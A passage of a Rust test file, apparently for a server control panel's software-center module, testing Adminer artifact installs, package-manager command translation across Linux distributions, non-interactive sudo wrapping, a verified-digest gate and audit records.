    let page = CatalogSearchPage::empty(&query);
    assert_eq!(page.sort, "recent");
}

/// Test double that returns a pre-baked byte stream for one URL and
/// records the requests it served. Used by the `install_artifact` end
/// to end test to prove the file lands on disk without hitting the
/// network.
struct MemoryArtifactFetcher {
    bytes: Vec<u8>,
    requested: std::sync::Mutex<Vec<String>>,
}

#[async_trait]
impl ArtifactFetcher for MemoryArtifactFetcher {
    async fn fetch(&self, url: &str) -> Result<Vec<u8>, SoftwareCenterError> {
        self.requested.lock().expect("lock").push(url.to_owned());
        Ok(self.bytes.clone())
    }
}

#[test]
fn install_artifact_downloads_and_places_adminer_under_webapps_root() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let sandbox = tempfile::tempdir().expect("tempdir");
        let webapps_root = sandbox.path().join("webapps");
        let bytes = b"<?php // adminer 4.8.1 placeholder".to_vec();
        let fetcher = Arc::new(MemoryArtifactFetcher {
            bytes: bytes.clone(),
            requested: std::sync::Mutex::new(Vec::new()),
        });
        let packages = MockPackages::new();
        let applications = MockApplications::new();
        let service = SoftwareCenterService::with_artifact_pipeline(
            Arc::new(packages),
            Arc::new(applications),
            Arc::new(MockAudit::stub()),
            None,
            true,
            fetcher.clone(),
            webapps_root.clone(),
            false,
        );
        let result = service
            .install_artifact(Uuid::new_v4(), Role::Owner, "adminer")
            .await
            .expect("install_artifact succeeds for adminer");
        assert_eq!(result.entry_id, "adminer");
        assert_eq!(result.entry_name, "Adminer 4");
        assert_eq!(result.version, "4.8.1");
        assert_eq!(result.archive_type, "file");
        assert_eq!(result.bytes, bytes.len() as u64);
        assert!(
            !result.digest_verified,
            "adminer seed ships a placeholder digest"
        );
        let filename = result
            .filename
            .expect("file install must report a filename");
        let placed = result.destination.clone();
        assert!(
            placed.is_file(),
            "placed path should be a regular file: {placed:?}"
        );
        let read_back = std::fs::read(&placed).expect("read placed file");
        assert_eq!(
            read_back, bytes,
            "placed bytes must match what the fetcher returned"
        );
        assert!(
            filename.ends_with(".php"),
            "adminer filename should be a .php file"
        );
        assert_eq!(
            fetcher.requested.lock().expect("lock").as_slice(),
            &["https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php"],
            "fetcher must receive the exact URL the adminer recipe pins",
        );
    });
}

#[test]
fn install_artifact_rejects_non_web_entries() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let sandbox = tempfile::tempdir().expect("tempdir");
        let webapps_root = sandbox.path().join("webapps");
        let fetcher = Arc::new(MemoryArtifactFetcher {
            bytes: Vec::new(),
            requested: std::sync::Mutex::new(Vec::new()),
        });
        let packages = MockPackages::new();
        let applications = MockApplications::new();
        let service = SoftwareCenterService::with_artifact_pipeline(
            Arc::new(packages),
            Arc::new(applications),
            Arc::new(MockAudit::stub()),
            None,
            true,
            fetcher,
            webapps_root,
            false,
        );
        let error = service
            .install_artifact(Uuid::new_v4(), Role::Owner, "nginx")
            .await
            .expect_err("system entries must be rejected by install_artifact");
        assert!(matches!(error, SoftwareCenterError::Invalid(_)));
    });
}

struct CapturedCommand {
    invocations: std::sync::Mutex<Vec<(&'static str, Vec<String>)>>,
    output_for: std::sync::Mutex<std::collections::HashMap<(String, String), String>>,
}

#[async_trait]
impl PackageCommand for CapturedCommand {
    async fn run(
        &self,
        program: &'static str,
        arguments: &[String],
    ) -> Result<CommandResult, SoftwareCenterError> {
        let key = (
            program.to_owned(),
            arguments.first().cloned().unwrap_or_default(),
        );
        let stdout = self
            .output_for
            .lock()
            .expect("output_for")
            .get(&key)
            .cloned()
            .unwrap_or_default();
        self.invocations
            .lock()
            .expect("invocations")
            .push((program, arguments.to_vec()));
        Ok(CommandResult::success(&stdout))
    }
}

#[test]
fn host_package_manager_translates_install_for_every_family() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        use openpanel_app::software_center::host_package_manager::Family;
        use openpanel_domain::software_center::PackageId;
        let pkg = PackageId::new("htop").expect("package id");
        for (family, expected_program, expected_first_arg) in [
            (Family::Apt, "/usr/bin/apt-get", "-y"),
            (Family::Dnf, "/usr/bin/dnf", "-y"),
            (Family::Yum, "/usr/bin/yum", "-y"),
            (Family::Pacman, "/usr/bin/pacman", "--noconfirm"),
            (Family::Apk, "/sbin/apk", "add"),
            (Family::Zypper, "/usr/bin/zypper", "--non-interactive"),
        ] {
            let captured = Arc::new(CapturedCommand {
                invocations: std::sync::Mutex::new(Vec::new()),
                output_for: std::sync::Mutex::new(std::collections::HashMap::new()),
            });
            let manager =
                HostPackageManager::for_family(family, captured.clone()).expect("for_family");
            manager
                .apply(&[PlanAction::Install(pkg.clone())])
                .await
                .expect("install");
            let invocations = captured.invocations.lock().expect("invocations");
            assert_eq!(
                invocations.len(),
                1,
                "expected one command for {family:?}, got {invocations:?}"
            );
            let (program, arguments) = &invocations[0];
            assert_eq!(*program, expected_program, "wrong program for {family:?}");
            assert_eq!(
                arguments[0], expected_first_arg,
                "wrong first arg for {family:?}"
            );
            assert!(
                arguments.iter().any(|arg| arg == "htop"),
                "package name missing for {family:?}: {arguments:?}"
            );
        }
    });
}

#[test]
fn host_package_manager_translates_remove_for_every_family() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        use openpanel_app::software_center::host_package_manager::Family;
        use openpanel_domain::software_center::PackageId;
        let pkg = PackageId::new("htop").expect("package id");
        for (family, expected_program) in [
            (Family::Apt, "/usr/bin/apt-get"),
            (Family::Dnf, "/usr/bin/dnf"),
            (Family::Yum, "/usr/bin/yum"),
            (Family::Pacman, "/usr/bin/pacman"),
            (Family::Apk, "/sbin/apk"),
            (Family::Zypper, "/usr/bin/zypper"),
        ] {
            let captured = Arc::new(CapturedCommand {
                invocations: std::sync::Mutex::new(Vec::new()),
                output_for: std::sync::Mutex::new(std::collections::HashMap::new()),
            });
            let manager =
                HostPackageManager::for_family(family, captured.clone()).expect("for_family");
            manager
                .apply(&[PlanAction::Remove(pkg.clone())])
                .await
                .expect("remove");
            let invocations = captured.invocations.lock().expect("invocations");
            assert_eq!(invocations.len(), 1, "{family:?} should run one command");
            let (program, _) = &invocations[0];
            assert_eq!(*program, expected_program, "wrong program for {family:?}");
            let _ = expected_program;
        }
    });
}

#[test]
fn host_package_manager_surfaces_apt_get_failure_with_the_real_stderr() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        use openpanel_app::software_center::host_package_manager::Family;
        use openpanel_domain::software_center::PackageId;
        let pkg = PackageId::new("apache2").expect("package id");
        let mut output_for = std::collections::HashMap::new();
        output_for.insert(
            ("/usr/bin/apt-get".to_owned(), "-y".to_owned()),
            "E: Unable to locate package apache2".to_owned(),
        );
        let captured = Arc::new(CapturedCommand {
            invocations: std::sync::Mutex::new(Vec::new()),
            output_for: std::sync::Mutex::new(output_for),
        });
        // Force the success command to fail.
        let captured = Arc::new(ForceFailCommand(captured));
        let manager = HostPackageManager::for_family(Family::Apt, captured).expect("for_family");
        let error = manager
            .apply(&[PlanAction::Install(pkg)])
            .await
            .expect_err("install should fail when the command returns failure");
        let SoftwareCenterError::Package(detail) = error else {
            panic!("expected Package error, got {error:?}");
        };
        assert!(
            detail.contains("apache2"),
            "package name should be in the diagnostic: {detail}"
        );
    });
}

struct ForceFailCommand(Arc<CapturedCommand>);

#[async_trait]
impl PackageCommand for ForceFailCommand {
    async fn run(
        &self,
        program: &'static str,
        arguments: &[String],
    ) -> Result<CommandResult, SoftwareCenterError> {
        let raw = self.0.run(program, arguments).await?;
        Ok(CommandResult::failure(&raw.output))
    }
}

struct RecordingCommand {
    invocations: std::sync::Mutex<Vec<(&'static str, Vec<String>)>>,
}

#[async_trait]
impl PackageCommand for RecordingCommand {
    async fn run(
        &self,
        program: &'static str,
        arguments: &[String],
    ) -> Result<CommandResult, SoftwareCenterError> {
        self.invocations
            .lock()
            .expect("invocations")
            .push((program, arguments.to_vec()));
        if program == "/usr/bin/sudo" {
            return Ok(CommandResult::failure("sudo: a password is required"));
        }
        Ok(CommandResult::success(""))
    }
}

#[test]
fn privileged_command_prepends_sudo_for_privileged_binaries() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let inner = Arc::new(RecordingCommand {
            invocations: std::sync::Mutex::new(Vec::new()),
        });
        let wrapper = PrivilegedCommand::new(inner.clone()).with_root_detector(Box::new(|| false));
        wrapper
            .run(
                "/usr/bin/apt-get",
                &[
                    "-y".to_owned(),
                    "install".to_owned(),
                    "--".to_owned(),
                    "apache2".to_owned(),
                ],
            )
            .await
            .expect_err("sudo rejection must propagate as a Package error");
        let invocations = inner.invocations.lock().expect("invocations");
        assert_eq!(invocations.len(), 1, "expected one invocation");
        let (program, arguments) = &invocations[0];
        assert_eq!(*program, "/usr/bin/sudo", "must invoke sudo when not root");
        assert_eq!(
            arguments[0], "-n",
            "sudo must run non-interactively so it never prompts on the daemon terminal"
        );
        assert_eq!(
            arguments[2], "/usr/bin/apt-get",
            "sudo args carry the original program"
        );
        assert!(arguments.contains(&"apache2".to_owned()));
    });
}

#[test]
fn privileged_command_short_circuits_for_read_only_binaries() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let inner = Arc::new(RecordingCommand {
            invocations: std::sync::Mutex::new(Vec::new()),
        });
        let wrapper = PrivilegedCommand::new(inner.clone()).with_root_detector(Box::new(|| false));
        wrapper
            .run("/usr/bin/dpkg-query", &["-W".to_owned()])
            .await
            .expect("read-only commands must succeed without sudo");
        let invocations = inner.invocations.lock().expect("invocations");
        assert_eq!(invocations.len(), 1);
        let (program, _) = &invocations[0];
        assert_eq!(
            *program, "/usr/bin/dpkg-query",
            "must not invoke sudo for read-only commands"
        );
    });
}

#[test]
fn privileged_command_short_circuits_when_panel_is_root() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let inner = Arc::new(RecordingCommand {
            invocations: std::sync::Mutex::new(Vec::new()),
        });
        let wrapper = PrivilegedCommand::new(inner.clone()).with_root_detector(Box::new(|| true));
        wrapper
            .run("/usr/bin/apt-get", &["-y".to_owned(), "install".to_owned()])
            .await
            .expect("root should short-circuit to the inner command");
        let invocations = inner.invocations.lock().expect("invocations");
        assert_eq!(invocations.len(), 1);
        let (program, _) = &invocations[0];
        assert_eq!(
            *program, "/usr/bin/apt-get",
            "root must invoke the program directly, not through sudo"
        );
    });
}

#[test]
fn privileged_command_surfaces_sudoers_snippet_on_failure() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let inner = Arc::new(RecordingCommand {
            invocations: std::sync::Mutex::new(Vec::new()),
        });
        let wrapper = PrivilegedCommand::new(inner).with_root_detector(Box::new(|| false));
        let error = wrapper
            .run(
                "/usr/bin/dnf",
                &["-y".to_owned(), "install".to_owned(), "nginx".to_owned()],
            )
            .await
            .expect_err("sudo rejection must be reported as a Package error");
        let SoftwareCenterError::Package(detail) = error else {
            panic!("expected Package error, got {error:?}");
        };
        assert!(
            detail.contains("/etc/sudoers.d/openpanel"),
            "error must name the sudoers file: {detail}"
        );
        assert!(
            detail.contains("visudo -c"),
            "error must include the sudo reload command: {detail}"
        );
        assert!(
            detail.contains("/usr/bin/apt-get")
                && detail.contains("/usr/bin/dnf")
                && detail.contains("/usr/bin/yum")
                && detail.contains("/usr/bin/zypper")
                && detail.contains("/usr/bin/pacman")
                && detail.contains("/sbin/apk"),
            "error must list every privileged binary: {detail}"
        );
    });
}

#[test]
fn place_artifact_refuses_placeholder_digest_when_gate_is_on() {
    use openpanel_app::software_center::PLACEHOLDER_SHA256;
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let pin = openpanel_domain::software_center::ArtifactPin {
            url: openpanel_domain::software_center::Homepage::new(
                "https://example.com/adminer.php",
            )
            .unwrap(),
            sha256: PLACEHOLDER_SHA256.to_owned(),
            archive_root: "adminer.php".to_owned(),
            archive_type: "file".to_owned(),
            sha1: None,
        };
        let bytes = b"<?php // adminer".to_vec();
        let temp = tempfile::tempdir().expect("tempdir");
        let error = place_artifact_with_gate(&pin, &bytes, temp.path(), true)
            .expect_err("placeholder digest must be refused when the gate is on");
        let SoftwareCenterError::Invalid(detail) = error else {
            panic!("expected Invalid, got {error:?}");
        };
        assert!(
            detail.contains("OPENPANEL__SOFTWARE__REQUIRE_VERIFIED_DIGESTS"),
            "error must name the gate: {detail}"
        );
    });
}

#[test]
fn place_artifact_allows_placeholder_when_opted_in() {
    use openpanel_app::software_center::PLACEHOLDER_SHA256;
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let pin = openpanel_domain::software_center::ArtifactPin {
            url: openpanel_domain::software_center::Homepage::new(
                "https://example.com/adminer.php",
            )
            .unwrap(),
            sha256: PLACEHOLDER_SHA256.to_owned(),
            archive_root: "adminer.php".to_owned(),
            archive_type: "file".to_owned(),
            sha1: None,
        };
        let bytes = b"<?php // adminer".to_vec();
        let temp = tempfile::tempdir().expect("tempdir");
        let placed = place_artifact_with_gate(&pin, &bytes, temp.path(), false)
            .expect("placeholder must install when the gate is off");
        assert!(
            !placed.digest_verified,
            "placeholder must report unverified"
        );
        let read_back = std::fs::read(&placed.path).expect("read");
        assert_eq!(read_back, bytes);
    });
}

struct CapturingAudit {
    events: std::sync::Mutex<Vec<openpanel_core::AuditEvent>>,
}

#[async_trait]
impl openpanel_core::AuditService for CapturingAudit {
    async fn record(
        &self,
        event: openpanel_core::AuditEvent,
    ) -> Result<(), openpanel_core::CoreError> {
        self.events.lock().expect("events").push(event);
        Ok(())
    }

    async fn recent(
        &self,
        _limit: i64,
    ) -> Result<Vec<openpanel_core::AuditEvent>, openpanel_core::CoreError> {
        Ok(self.events.lock().expect("events").clone())
    }
}

#[test]
fn install_artifact_records_audit_with_source_digest_and_platform() {
    use openpanel_core::AuditAction;
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let sandbox = tempfile::tempdir().expect("tempdir");
        let webapps_root = sandbox.path().join("webapps");
        let bytes = b"<?php // adminer".to_vec();
        let fetcher = Arc::new(MemoryArtifactFetcher {
            bytes: bytes.clone(),
            requested: std::sync::Mutex::new(Vec::new()),
        });
        let audit = Arc::new(CapturingAudit {
            events: std::sync::Mutex::new(Vec::new()),
        });
        let packages = MockPackages::new();
        let applications = MockApplications::new();
        let service = SoftwareCenterService::with_artifact_pipeline(
            Arc::new(packages),
            Arc::new(applications),
            audit.clone(),
            None,
            true,
            fetcher,
            webapps_root,
            false,
        );
        let actor = Uuid::new_v4();
        let _ = service
            .install_artifact(actor, Role::Owner, "adminer")
            .await
            .expect("install_artifact");
        let events = audit.events.lock().expect("events");
        let event = events
            .iter()
            .find(|event| event.action == AuditAction::SoftwareArtifactInstalled)
            .expect("artifact install event must be recorded");
        assert_eq!(event.target.as_deref(), Some("adminer"));
        let metadata = &event.metadata;
        assert_eq!(
            metadata.get("source_url").and_then(|value| value.as_str()),
            Some("https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php"),
            "metadata must record the source URL, got {metadata}"
        );
        assert_eq!(
            metadata.get("bytes").and_then(|value| value.as_u64()),
            Some(bytes.len() as u64),
            "metadata must record the bytes written, got {metadata}"
        );
        assert_eq!(
            metadata
                .get("digest_verified")
                .and_then(|value| value.as_bool()),
            Some(false),
            "placeholder digest must be reported as unverified, got {metadata}"
        );
        let platform = metadata
            .get("platform")
            .expect("platform key must be present");
        assert_eq!(
            platform.get("id").and_then(|value| value.as_str()),
            Some("ubuntu"),
            "platform must record the host OS id, got {platform}"
        );
        assert_eq!(
            platform.get("version_id").and_then(|value| value.as_str()),
            Some("24.04"),
            "platform must record the host OS version, got {platform}"
        );
        assert_eq!(
            platform.get("arch").and_then(|value| value.as_str()),
            Some("x86_64"),
            "platform must record the host arch, got {platform}"
        );
    });
}

#[test]
fn install_artifact_refuses_when_gate_is_on_for_placeholder_entry() {
    use openpanel_app::software_center::PLACEHOLDER_SHA256;
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let sandbox = tempfile::tempdir().expect("tempdir");
        let webapps_root = sandbox.path().join("webapps");
        let fetcher = Arc::new(MemoryArtifactFetcher {
            bytes: b"<?php // adminer".to_vec(),
            requested: std::sync::Mutex::new(Vec::new()),
        });
        let audit = Arc::new(CapturingAudit {
            events: std::sync::Mutex::new(Vec::new()),
        });
        let packages = MockPackages::new();
        let applications = MockApplications::new();
        // require_verified_digests = true: the service refuses adminer.
        let service = SoftwareCenterService::with_artifact_pipeline(
            Arc::new(packages),
            Arc::new(applications),
            audit.clone(),
            None,
            true,
            fetcher,
            webapps_root,
            true,
        );
        let error = service
            .install_artifact(Uuid::new_v4(), Role::Owner, "adminer")
            .await
            .expect_err("adminer must be refused when the gate is on");
        let SoftwareCenterError::Invalid(detail) = error else {
            panic!("expected Invalid, got {error:?}");
        };
        assert!(
            detail.contains("OPENPANEL__SOFTWARE__REQUIRE_VERIFIED_DIGESTS"),
            "error must name the gate: {detail}"
        );
        let events = audit.events.lock().expect("events");
        let artifact_event = events
            .iter()
            .find(|event| event.action == openpanel_core::AuditAction::SoftwareArtifactInstalled);
        assert!(
            artifact_event.is_none(),
            "no install event must be recorded for a refused install"
        );
        // Sanity: the placeholder is the value we expect to be reported.
        assert!(PLACEHOLDER_SHA256.starts_with('0'));
    });
}

#[test]
fn last_install_badge_reports_actor_platform_and_unverified_digest() {
    use openpanel_app::software_center::InstallBadge;
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let sandbox = tempfile::tempdir().expect("tempdir");
        let webapps_root = sandbox.path().join("webapps");
        let fetcher = Arc::new(MemoryArtifactFetcher {
            bytes: b"<?php // adminer".to_vec(),
            requested: std::sync::Mutex::new(Vec::new()),
        });
        let audit = Arc::new(CapturingAudit {
            events: std::sync::Mutex::new(Vec::new()),
        });
        let service = SoftwareCenterService::with_artifact_pipeline(
            Arc::new(MockPackages::new()),
            Arc::new(MockApplications::new()),
            audit.clone(),
            None,
            true,
            fetcher,
            webapps_root,
            false,
        );
        let actor = Uuid::new_v4();
        let _ = service
            .install_artifact(actor, Role::Owner, "adminer")
            .await
            .expect("install_artifact");
        let badge = service
            .last_install_badge(Role::Owner, "adminer")
            .await
            .expect("last_install_badge")
            .expect("adminer must have a badge after install");
        assert_eq!(badge.actor, actor.to_string());
        assert!(
            badge.digest_unverified,
            "placeholder digest must render as unverified"
        );
        assert_eq!(
            badge.display(),
            format!("{actor} · digest unverified"),
            "display must favour the digest warning over the platform"
        );
        let platform = badge
            .platform
            .expect("platform must be recorded on the badge");
        assert!(
            platform.starts_with("ubuntu"),
            "badge platform must compose the OS id, got {platform}"
        );
        assert_eq!(
            service
                .last_install_badge(Role::Owner, "unknown-entry")
                .await
                .expect("last_install_badge"),
            None,
            "no badge for an entry with no installs"
        );
        let _ = InstallBadge {
            actor: "alice".into(),
            platform: Some("ubuntu 24.04 x86_64".into()),
            digest_unverified: false,
        }
        .display();
    });
}

#[test]
fn last_install_badge_renders_system_component_with_platform_and_success() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let audit = Arc::new(CapturingAudit {
            events: std::sync::Mutex::new(vec![
                openpanel_core::AuditEvent::new(
                    "alice",
                    openpanel_core::AuditAction::SoftwareChanged,
                    openpanel_core::AuditOutcome::Success,
                )
                .target("nginx")
                .metadata(serde_json::json!({
                    "operation": "installed",
                    "plan_digest": "digest",
                    "platform": {"id": "ubuntu", "version_id": "24.04", "arch": "x86_64"},
                })),
            ]),
        });
        let service = SoftwareCenterService::with_artifact_pipeline(
            Arc::new(MockPackages::new()),
            Arc::new(MockApplications::new()),
            audit.clone(),
            None,
            true,
            Arc::new(MemoryArtifactFetcher {
                bytes: Vec::new(),
                requested: std::sync::Mutex::new(Vec::new()),
            }),
            std::env::temp_dir(),
            false,
        );
        let badge = service
            .last_install_badge(Role::Owner, "nginx")
            .await
            .expect("last_install_badge")
            .expect("nginx must have a badge after install");
        assert_eq!(
            badge.display(),
            "alice · ubuntu 24.04 x86_64 · succeeded",
            "system badge must compose actor, platform, and result"
        );
    });
}

#[test]
fn start_artifact_install_runs_in_background_and_reports_progress() {
    use openpanel_app::software_center::InstallTaskState;
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let sandbox = tempfile::tempdir().expect("tempdir");
        let webapps_root = sandbox.path().join("webapps");
        let fetcher = Arc::new(MemoryArtifactFetcher {
            bytes: b"<?php // adminer 4.8.1 background".to_vec(),
            requested: std::sync::Mutex::new(Vec::new()),
        });
        let audit = Arc::new(CapturingAudit {
            events: std::sync::Mutex::new(Vec::new()),
        });
        let service = Arc::new(SoftwareCenterService::with_artifact_pipeline(
            Arc::new(MockPackages::new()),
            Arc::new(MockApplications::new()),
            audit.clone(),
            None,
            true,
            fetcher,
            webapps_root,
            false,
        ));
        let actor = Uuid::new_v4();
        let task_id = service
            .start_artifact_install(actor, Role::Owner, "adminer")
            .await
            .expect("start_artifact_install");

        // The task runs in the background; poll until terminal.
        let mut observed_queued = false;
        let mut final_task = None;
        for _ in 0..10_000 {
            let task = service.task_progress(&task_id).expect("task must be live");
            if matches!(task.state, InstallTaskState::Queued) {
                observed_queued = true;
            }
            if matches!(
                task.state,
                InstallTaskState::Installed | InstallTaskState::Failed
            ) {
                final_task = Some(task);
                break;
            }
            tokio::task::yield_now().await;
        }
        let task = final_task.expect("task must reach a terminal state");
        assert!(
            observed_queued,
            "task should start queued before the download begins"
        );
        assert_eq!(
            task.state,
            InstallTaskState::Installed,
            "task must finish installed, got {} detail={:?}",
            task.state.as_str(),
            task.detail
        );
        assert_eq!(task.percent, 100);
        assert_eq!(task.entry_id, "adminer");

        let events = audit.events.lock().expect("events");
        let installed = events
            .iter()
            .find(|event| event.action == openpanel_core::AuditAction::SoftwareArtifactInstalled)
            .expect("background task must record the audit event");
        assert_eq!(installed.target.as_deref(), Some("adminer"));
        assert_eq!(
            installed
                .metadata
                .get("digest_verified")
                .and_then(|v| v.as_bool()),
            Some(false),
            "placeholder digest must be reported as unverified"
        );
    });
}

#[test]
fn start_artifact_install_refuses_placeholder_when_gate_is_on() {
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    runtime.block_on(async {
        let sandbox = tempfile::tempdir().expect("tempdir");
        let service = Arc::new(SoftwareCenterService::with_artifact_pipeline(
            Arc::new(MockPackages::new()),
            Arc::new(MockApplications::new()),
            Arc::new(CapturingAudit {
                events: std::sync::Mutex::new(Vec::new()),
            }),
            None,
            true,
            Arc::new(MemoryArtifactFetcher {
                bytes: b"<?php // adminer".to_vec(),
                requested: std::sync::Mutex::new(Vec::new()),
            }),
            sandbox.path().join("webapps"),
            true,
        ));
        let error = service
            .start_artifact_install(Uuid::new_v4(), Role::Owner, "adminer")
            .await
            .expect_err("adminer must be refused before a task is queued");
        let SoftwareCenterError::Invalid(detail) = error else {
            panic!("expected Invalid, got {error:?}");
        };
        assert!(
            detail.contains("OPENPANEL__SOFTWARE__REQUIRE_VERIFIED_DIGESTS"),
            "error must name the gate: {detail}"
        );
        assert!(
            service.artifact_tasks().is_empty(),
            "no task must be queued when the gate refuses upfront"
        );
    });
}
